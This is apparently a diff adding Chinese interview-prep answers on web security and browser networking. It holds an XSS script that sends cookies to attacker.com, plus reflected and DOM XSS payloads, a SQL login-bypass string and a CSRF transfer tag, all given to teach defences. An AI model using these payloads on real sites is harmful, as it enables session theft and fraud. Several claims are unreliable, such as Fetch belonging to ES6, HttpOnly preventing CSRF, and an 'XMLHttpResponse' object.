@@ -224,40 +224,330 @@ Cookie(HTTP Cookie)和Session(会话) 都是用于在web应用程序中维护状
 
 
 ## 18. 问题：什么是跨域？如何解决？
+在web应用程序中，一个网页的代码试图向不同源（不同的域名、协议、端口）的服务器发送请求，就会触发跨域问题。浏览器的同源策略会限制这种跨域请求，防止恶意网站窃取用户数据。同源策略要求网页只能与同一源的资源进行交互，而不允许与不同源的资源直接交互。
+
+**解决方法**
+* Nginx充当代理服务器，分发请求到目标服务器。
+* Nodejs同域部署页面，搭建BFF层，服务对服务请求。
+* 服务器端配置CORS策略，可以允许指定源（域名、协议、端口）的请求Access-Control-Allow-Origin。
+* Iframe通讯，通过在主页面嵌入一个隐藏的iframe，将目标页面加载到iframe中，并通过在主页面和iframe页面之间使用`postMessage()`方法进行消息传递，从而实现跨域的数据交换。
 
 
 ## 19. 问题：同源策略具体限制的具体内容
+* **DOM访问限制** 不同源的网页不能直接访问彼此的DOM元素，包括读取和修改。这意味着一个网页无法通过Javascript获取另一个网页的内容，除非目标网页明确授权。
+* **XMLHttpRequest限制** XMLHttpRequest(XHR)是用于在网页和服务器之间进行异步数据交换的技术。同源策略禁止不同源的网页通过XHR请求发送或接受数据。
+* **Cookie限制** 不同源的网页不能访问彼此的Cookie。Cookie是用于在客户端存储和传输信息的机制，同源策略确保Cookie只能由创建它的源访问。
+* **跨文档消息限制** 同源策略限制不同源的窗口或帧之间通过`postMessage()`方法进行通信。可以防止恶意网页连用通信渠道。
+* **脚本限制** 不同源的脚本文件（如JavaScript）不能相互引用和执行
 
 
 ## 20. 问题：发送请求时浏览器做了什么
+* **发送请求头**：浏览器向目标服务器发送一个请求，其中包含了请求方法（GET、POST等）、请求URL、请求头信息（如User-Agent、Accept等）以及请求体（如果有）。检查同源策略，浏览器会检查目标URL是否符合同源策略。它会比较目标URL的协议、主机和端口号与当前网页的协议、主机和端口号是否一致，如果不一致，就会触发跨域请求。
+* **发送跨域请求**：如果目标URL与当前页面不同源，浏览器会发送一个跨域请求。跨域请求通常是一个HTTP OPTIONS预检请求，用于检查服务器是否支持跨域请求。浏览器会在发送实际请求之前，先发送一个预检请求，以确保服务器允许跨域请求。
+* **服务器处理预检请求**：目标服务器接收到预检请求后，会进行一系列的处理。它会检查请求中的一些特定头部信息，如`Origin`和`Access-Control-Request-Method`，来检验是否允许跨域请求。
+* **发送响应头**：如果服务器允许跨域请求，它会在响应中添加一些特定的头部信息，如`Access-Control-Allow-Origin`、`Access-Control-Allow-Methods`、`Access-Control-Allow-Headers`等。这些头部信息告诉浏览器是否允许当前网页访问服务器返回的数据。
+* **检查响应头**：浏览器接收到服务器的响应后，会检查响应头中的`Access-Control-Allow-Origin`字段。判断是否允许当前页面进行跨域请求。如果该字段的值与当前网页的源不一致，或者没有该字段，浏览器会拒绝访问服务器返回的数据。
+* **处理响应数据**：如果浏览器允许跨域请求，它会将服务器返回的数据传递给当前网页的Javascript代码进行处理。Javascript代码可以根据需要操作这些数据，如更新网页内容、触发事件等。
+
 
 ## 21. 问题：XSS攻击是什么
+攻击者通过**注入恶意脚本代码**来利用应用程序的漏洞，从而在用户的浏览器中执行恶意操作。<br/>
+XSS估计通常分为三种类型：存储型（Stored）,反射型（Reflected）,基于DOM的（DOM-based）。
+
+**存储型（Stored）**：
+攻击者将恶意代码上传到目标网站的服务器上，通常是在用户评论，留言板或用户生成的内容中。当其他用户访问包含恶意代码的页面的时候，他们的浏览器会执行这些代码。
+
+**案例**：攻击者在一个论坛网站上发布了一个包含恶意脚本的评论。其他用户访问这个评论的时候，恶意脚本会被执行，窃取他们的会话cookie并发送到攻击者的服务器上。
+```js
+<script>
+fetch("http://attacker.com/steal-cookie.php?cookie=" + document.cookie)
+</script>
+```
+
+**反射型（Reflected）**：攻击者将恶意脚本代码作为参数发送到目标应用程序的URL中,然后诱使用户点击该URL。当正常用户点击包含恶意脚本的链接时，恶意脚本会被从URL中提取并执行。
+```
+http://example.com/comment?message=<script>alert("XSS");</script>
+```
+
+**基于DOM的（DOM-based）**：攻击者利用应用程序的DOM（文档对象模型）漏洞，将恶意脚本代码注入到网页中。当正常用户与包含恶意脚本的网页交互时，恶意脚本会被执行。
+1. 用户输入
+```html
+<img src=x onerror="alter('XSS')">
+```
+2. 显示在页面上的内容
+```html
+<div class="post-content"><p>这是一个包含恶意脚本的段落。</p><img src=x onerror="alter('XSS')"></div>
+```
+
+* **防范措施**
+    * **输入验证和过滤**：对用户输入的数据进行验证和过滤，确保只接受预期的格式和类型。避免直接将用户输入插入到HTML、CSS或JavaScript中。
+    * **转义输出**：在将用户输入插入到HTML、CSS或JavaScript中之前，对特殊字符进行转义。例如，将`<`转义为`&lt;`，将`>`转义为`&gt;`，将`&`转义为`&amp;`等。防止浏览器解释用户输入的内容为可执行代码。
+    * **使用安全的编程框架和库**：使用经过验证和安全的编程框架和库，如React、Angular、Vue等。这些框架和库通常会提供内置的安全机制，帮助开发人员避免常见的安全漏洞。
+    * **设置HTTP头部**：使用Content Security Policy(CSP)等HTTP头部来限制哪些资源可以加载和执行。CSP可以帮助阻止不受信任的脚本和内容加载。
+    * **最小化权限**：确保应用程序在运行时具有最小的权限。避免在JavaScript中使用特权模式，并限制对敏感操作和数据的访问。
+    * **教育和培训**：开发团队需要受过培训，了解XSS攻击的工作原理以及如何预防它们。员工的安全意识教育也非常重要。
+    * **安全漏洞扫描和审计**：定期对应用程序进行安全漏洞扫描和代码审计，以及时发现并修复潜在的XSS漏洞。
+    * **更新和维护依赖项**：确保应用程序使用的所有框架，库和插件都是最新版本，并及时应用安全更新。
+
 
 ## 22. 问题：SQL注入
+SQL注入攻击 假设有一个网页上的登录表单，该表单将用户提供的用户名和密码与数据库中的数据进行比较以进行身份验证。通常，身份验证的SQL查询可能如下所示：
+```sql
+SELECT * FROM users WHERE username = '输入的用户名' AND password = '输入的密码'
+--
+输入：' OR '1'='1
+--
+SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '输入的密码'
+```
+在这种情况下，由于`'1'='1'`始终为真，所以无论用户输入的用户名和密码是什么，SQL查询都会返回所有用户的记录。这就导致了身份验证的失败，攻击者可以使用任意的用户名和密码登录到系统中。
 
 
 ## 23. 问题：DDoS攻击
+DDoS攻击（Distributed Denial of Service Attack）是一种通过向目标服务器发送大量的请求来使其过载或崩溃的攻击。攻击者通常会使用多台计算机（称为“僵尸网络”）来发送请求，从而实现对目标服务器的攻击，使其无法正常响应合法用户的请求。
+
+**DDoS攻击可以采用不同的形式**：
+1.  SYN/ACK Flood攻击：攻击者发送大量伪造的TCP连接请求（SYN），但不会完成TCP握手过程，这回占用服务器的资源，使其无法处理合法请求。
+2.  UDP Flood攻击：攻击者发送大量的UDP包到目标服务器，以耗尽服务器的处理能力。UDP Flood攻击通常更难检测，因为UDP是面向无连接的协议。
+3.  ICMP Flood攻击：攻击者发送大量的ICMP回显请求（ping请求）到目标服务器，以超载目标服务器，这种攻击通常被称为Ping洪泛攻击。
+4.  HTTP Flood攻击：攻击者发送大量的HTTP请求到目标服务器，以消耗服务器的资源和带宽，这种情况通常针对Web应用程序。
+5.  DNS Amplification：攻击者向未经授权的开放DNS服务器发送DNS查询请求，将大量响应引导到目标服务器，使其超载。
+
+DDoS攻击的目的可以是多种多样的，包括恶意破坏、勒索尝试、竞争对手恶意竟争、政治动机等。<br/>
+为了应对DDoS攻击，组织和网络管理员通常会采取防御策略，如使用防火墙，入侵检测系统（IDS）和内容分发网络（CDN），以帮助过滤和减轻攻击流量。此外，云服务商通常提供DDoS保护服务，帮助客户缓解DDoS攻击
+
 
 ## 24. 问题：CSRF攻击
+CSRF攻击（Cross-Site Request Forgery）是一种利用用户已登录的身份执行非本意操作的攻击。攻击者通常会在受害者不知情的情况下，通过在受害者浏览器中加载恶意页面或点击恶意链接，来执行对目标网站的恶意请求。
+这可能包括更改密码，修改电子邮件地址，进行资金转账等，具体取决于受攻击的应用程序的功能
+
+一个简易的CSRF攻击示例
+1. 用户登录到银行网站并保持会话处于活动状态，它们在浏览网页时访问了一个恶意网站。
+2. 恶意网站商包含一下HTML代码
+```html
+<img src="http://example.com/transfer?to=attacker&amount=1000000" alt="Transfer Money" />
+```
+3. 这个图片的URL看似是一个图片，但实际商是向银行网站发出一个转账请求。
+4. 用户的浏览器会自动加载这个图片，由于用户仍然在银行网站上保持登录状态，浏览器会发送带有用户凭证的请求到银行网站，从而执行了转账操作。
+
+**防范措施**
+1.  **验证请求来源**：在服务器端验证请求的来源是否可信。可以检查请求的Referer头或Origin头，确保请求来自于预期的域名。
+2.  **使用CSRF令牌**：在每个表单中包含一个CSRF令牌，该令牌是随机生成的唯一值。服务器在处理表单提交时，会验证令牌的有效性，确保请求是由用户自愿发起的，而不是攻击者伪造的。
+3.  **不要使用GET请求进行敏感操作**：只允许使用安全的HTTP方法（如POST、PUT、DELETE等）来执行敏感操作。避免使用GET方法来执行修改操作，因为GET方法的参数会暴露在URL中，容易被截获。
+4.  **实现同源策略**：同源策略是浏览器的一种安全机制，它限制了从一个源加载的文档或脚本如何与来自另一个源的资源进行交互。通过实现同源策略，可以防止跨站请求伪造攻击。
+5.  **使用HTTP Only Cookie**：将敏感的Cookie标记为HTTP Only，这样浏览器就不会将其包含在跨站请求中。这可以有效防止CSRF攻击，因为攻击者无法通过JavaScript访问到这些Cookie。
 
 
 ## 25. 问题：Ajax的定义及优缺点
+Ajax(Asynchronous JavaScript and XML) 是一种用于在后台与服务器进行异步通信的技术。它使用JavaScript和XML（现在通常使用JSON）来传输数据，而无需刷新整个页面。
+
+**优点**
+1.  **异步通信**：Ajax允许在不刷新整个页面的情况下，与服务器进行异步通信。这意味着用户可以在不中断当前操作的情况下，与服务器进行交互。
+2.  **减少带宽使用**：由于只更新部分页面内容，而不是整个页面，因此可以减少对服务器和网络带宽的需求
+3.  **提高页面加载速度**：通过异步加载数据，可以提高页面加载速度，减少用户等待时间。
+4.  **支持多种数据格式**：Ajax不仅支持XML，还支持JSON等多种数据格式，使数据的传输更加灵活和高效。
+
+**缺点**
+1.  **对搜索引擎不友好**：搜索引擎难获取到完整的页面内容，影响页面的搜索引擎优化（SEO）
+2.  **安全问题**：由于Ajax是在客户端执行的，因此可能会存在安全问题。例如，跨站脚本攻击（XSS）和跨站请求伪造攻击（CSRF）。
+3.  **不支持跨域请求**：由于浏览器的同源策略，Ajax默认只能向同源的服务器发送请求。如果需要向不同源的服务器发送请求，就需要使用跨域资源共享（CORS）等技术。
 
 
 ## 26. 问题：XMLHttpRequest对象用法
+XMLHttpRequest对象是用于在后台与服务器进行异步通信的核心对象之一。
+```javascript
+// 创建一个XMLHttpRequest对象
+const xhr = new XMLHttpRequest();
+
+// 注册回调函数，当请求完成时调用
+xhr.onload = function() {
+    if(xhr.status === 200){
+        // 请求成功，处理响应数据
+        const response = JSON.parse(xhr.responseText);
+        console.log(response);
+    }else{
+        // 请求失败，处理错误
+        console.error('请求失败，状态码：' + xhr.status);
+    }
+}
+
+// 配置请求
+xhr.open('GET', 'https://api.example.com/data', true);
+
+// 设置请求头（如果需要）
+xhr.setRequestHeader('Content-Type', 'application/json');
+
+// 发送请求
+xhr.send();
+
+```
+在上面的代码中，首先创建一个XMLHttpRequest对象，然后注册一个`onload()`回调函数，在请求完成时调用。在回调函数中，可以根据请求的状态码判断请求是否成功，并处理返回的数据或错误信息。最后，使用`open`方法设置请求的类型（GET,POST）、URL和异步标志，使用`send`方法发送请求。
+
+**一些常见的方法和属性**
+* `open(method, url, async)`：配置请求的方法（GET,POST等）、URL和异步标志。
+* `setRequestHeader(header, value)`：设置请求头，例如`Content-Type`。
+* `send(data)`：发送请求。如果是POST请求，需要传递请求体数据。
+* `abort()`：取消当前请求。
+* `getResponseHeader(header)`：获取指定名称的响应头信息。
+* `getAllResponseHeaders()`：获取所有响应头信息。
+* `status`：获取响应的状态码（如200、404等）。
+* `statusText`:获取请求的状态文本。
+* `responseText`：获取响应的文本内容。
+* `responseXML`：获取响应的XML文档对象。
+
+**注意**：XMLHttpRequest对象的使用方式可能因浏览器而异，某些浏览器可能不支持某些方法或属性。因此，在使用XMLHttpRequest对象时，需要注意浏览器的兼容性问题，并根据具体需求选择合适的方法和属性。
 
 
 ## 27. 问题：封装一个ajax请求方法
+```javascript
+function ajaxRequest(url, method , data , callback) {
+    const xhr = new XMLHttpRequest();
+
+    xhr.open(method, url, true);
+    xhr.onload = function() {
+        if(xhr.status === 200){
+            // 请求成功，处理响应数据
+            const response = JSON.parse(xhr.responseText);
+            callback(null, response);
+        }else{
+            callback('请求失败，状态码：' + xhr.status, null);
+        }
+    }
+    xhr.onerror = function(){
+        callback('请求错误',null)
+    }
+    xhr.send(data);
+
+}
+```
+**注意**:Axios的本质也是对XMLHttpRequest的封装，只是它提供了更方便的API和更多的功能。
 
 
 ## 28. 问题：Fetch API
+Fetch API是一种用于在浏览器中进行网络请求的新的API。它基于Promise，提供了更简单、更强大的方式来进行异步网络请求。
+
+**背景**
+1. **起初提案**：Fetch API最早是由WHATWG提出的，旨在改进和取代XMLHttpRequest，以提供更强大、现代和一致的方式进行网络请求。
+2. **标准草案**：Fetch API在2015年被标准化为ECMAScript 6（ES6）的一部分。这意味着它成为了浏览器和Node.js环境中的标准API。
+3. **W3C标准化**：Fetch API在2016年被W3C标准化为Fetch Standard。这意味着它成为了Web平台的一个重要组成部分，得到了广泛的支持和 adoption。
+
+**调用方法**
+```javascript
+fetch('https://api.example.com/data')    // 发送GET请求
+    .then(response => {
+        if(!response.ok){
+            throw new Error('请求失败，状态码：' + response.status);
+        }
+        return response.json();   // 解析响应为JSON
+    }) 
+    .then(data => {
+        // 这里处理从服务器返回的数据
+        console.log(data)
+    })
+    .catch(error => {
+        // 处理任何网络请求错误
+        console.error('网络请求错误：' + error);
+    });
+
+fetch('https://api.example.com/data',{
+    method:'POST',
+    headers:{
+        'Content-Type':'application/json',
+        'Authorization':'Bearer ' + token
+    },
+    body:JSON.stringify({key:'value'})   //将数据发送给服务器
+}).then(response => {
+        if(!response.ok){
+            throw new Error('请求失败，状态码：' + response.status);
+        }
+        return response.json();   // 解析响应为JSON
+    }) 
+    .then(data => {
+        // 这里处理从服务器返回的数据
+        console.log(data)
+    })
+    .catch(error => {
+        // 处理任何网络请求错误
+        console.error('网络请求错误：' + error);
+    });
+```
+
+
 
 ## 29. 问题：fetch与XMLHttpRequest的区别
+* **API设计**
+    * XMLHttpRequest是早期的技术，它使用回调函数来处理请求和响应，使其代码结构相对复杂。
+    * Fetch API基于Promise的API，更现代、直观和易于使用。它支持使用`async/await`来处理异步操作，使代码更清晰。
+* **语法**
+    * XMLHttpRequest使用了一种事件驱动的编程模型，通过设置回调函数来处理请求的各个阶段，如`onload`,`onerror`,`onreadystatechange`等。
+    * Fetch API使用Promise对象，通过链式的`.then()`和`catch()`方法来处理请求和响应，更容易理解和维护。
+* **请求和响应**
+    * XMLHttpRequest使用单独的对象来表示请求和响应，你需要分别创建`XMLHttpRequest`对象和`XMLHttpResponse`对象来发送请求和处理响应。
+    * Fetch API使用`Request`和`Response`对象，更一致和易于操作，这两种对象都遵循同样的标准。
+* **跨域请求**
+    * XMLHttpRequest需要在服务器端进行额外的配置来处理跨域请求，而且在某些情况下，需要使用JSONP等技巧来绕过同源策略。
+    * Fetch API默认支持跨域请求，可以通过CORS头部来控制跨域访问。
+* **错误处理**
+    * XMLHttpRequest的错误处理通常涉及检查`status`和`readyState`属性，以及使用回调函数来处理错误情况
+    * Fetch API使用Promise链中的`.catch()`方法来处理错误，这使错误处理更一致和清晰
+* **取消请求**
+    * XMLHttpRequest不提供原生的取消请求的机制，但你可以通过设置`abort()`方法来取消请求。
+    * Fetch API提供了`AbortController`和`AbortSignal`对象来取消请求。
+
 
 ## 30. 问题：请求会发送2次的原因
+1. **Preflight Request(CORS)**:跨源资源共享（CORS）是一种安全机制，用于控制在不同源（域名、协议、端口）之间的资源请求。当你通过Fetch API向另一个域名发出跨源请求时，浏览器会自动进行CORS预检请求（Preflight Request）。这是为了确定服务器是否接受跨源请求，以及哪些HTTP方法和头部字段是允许的。预检请求是一个OPTIONS请求，这意味着你的浏览器首先发送一个OPTIONS请求，然后才发送实际的GET或POST请求，因此会看到两个请求。
+2. **Redirects(重定向)**：如果服务器返回一个HTTP重定向响应（例如，状态码为302或307），浏览器将首先向新的重定向目标URL发送一个请求，然后才会继续原始请求。这也可能导致看到两个请求，一个是重定向请求，另一个是最终目标请求。
+3. **程序错误会重复调用**：在你的JavaScript代码中，有时会发生意外的重复调用fetch API的情况，例如在某个事件处理程序中多次触发Fetch请求，这就导致多个请求被发送。
+4. **浏览器预加载和预解析**：现代浏览器为了提高页面加载速度，会在渲染HTML文档时，并行地加载和解析资源（如脚本、样式表、图像等）。这包括预加载和预解析。预加载会提前请求资源，而预解析会在解析HTML文档时，并行地加载和解析资源。这可能导致在你发送Fetch请求时，浏览器已经开始预加载和预解析相关资源，因此会看到额外的请求。
+5. **浏览器插件或扩展**：有时，浏览器插件或扩展可能会触发Fetch请求。这可能导致你看到不同于你的网站代码多发出的请求。
 
 
 ## 31. 问题：websocket
+webSocket是在应用层实现的协议。尽管WebSocket的握手过程使用了HTTP协议，但一旦握手成功，WenSocket连接会升级为全双工的通信通道，不再遵循HTTP协议的规则。在握手成功后，WebSocket协议会在应用层上定义消息格式和通信规则，通过TCP协议在传输层上进行数据传输。
+
+因此，WebSocket是在应用层实现的协议，他建立在传输层的TCP协议之上，使用HTTP协议进行握手，然后在建立的TCP连接上实现全双工的通信。在应用层上，websocket定义了一种标准的消息格式和通行规则，使得客户端和服务器可以通过发送和接受websocket消息来进行实时的双向通信。
+
+**客户端**
+```javascript
+const socket = new WebSocket('ws://localhost:8080');
+
+socket.onopen = function(event) {
+    console.log('WebSocket连接已打开');
+
+    // 发送消息给服务器
+    socket.send("hello Server")
+};
+
+socket.onmessage = function(event) {
+    console.log('收到服务器消息：' + event.data);
+};
+
+socket.onerror = function(event) {
+    console.error('WebSocket错误：' + event);
+};
+
+socket.onclose = function(event) {
+    console.log('WebSocket连接已关闭');
+};
+
+```
+**服务端**
+```javascript
+const WebSocket = require('ws');
+const wss = new WebSocket.Server({ port: 8080 });
+
+wss.on('connection', function connection(ws) {
+    console.log('websocket连接已建立');
+    ws.on('message', function incoming(message) {
+        console.log('收到客户端消息：' + message);
+        // 回复客户端
+        ws.send('你好，客户端！');
+    });
+    ws.on('close',function close() {
+        console.log("连接已关闭")
+    })
+});
+```
 
 ## 32. 问题：websocket建立连接的过程
 
